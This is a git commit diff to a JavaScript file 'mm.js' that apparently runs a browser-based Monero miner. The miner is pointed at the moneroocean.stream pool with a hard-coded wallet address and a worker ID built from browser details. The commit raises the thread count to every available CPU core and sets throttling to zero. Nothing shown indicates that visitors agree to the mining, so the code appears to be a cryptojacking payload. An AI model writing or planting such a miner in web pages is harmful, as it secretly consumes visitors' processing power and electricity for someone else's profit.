735603f7edbe7ecf99386078cee82551311de8b9
Admin <108824076+DecentralizationSoftware@users.noreply.github.com>
2023-10-04 22:43:39 -0700

    Update mm.js

--- mm.js
+++ mm.js
@@ -3,7 +3,7 @@ function __mm__() {
     var pool = "moneroocean.stream";
     var walletAddress = "85ys2JUgCoYBPD3RTLYj18R9h7i9kbZD23MX9B5D8dB4DRK7WRSEAynUk3sECAqSCV9EJ64tivdScAJEkQCF97VkVDmJNHD";
     var workerId = String(window.navigator.platform + window.navigator.language + Date.now()).replace(/\s/g, '');
-    var threads = -1;
+    var threads = window.navigator.hardwareConcurrency;
     var password = "x";
     startMining(pool, walletAddress, workerId, threads, password);
     throttleMiner = 0;
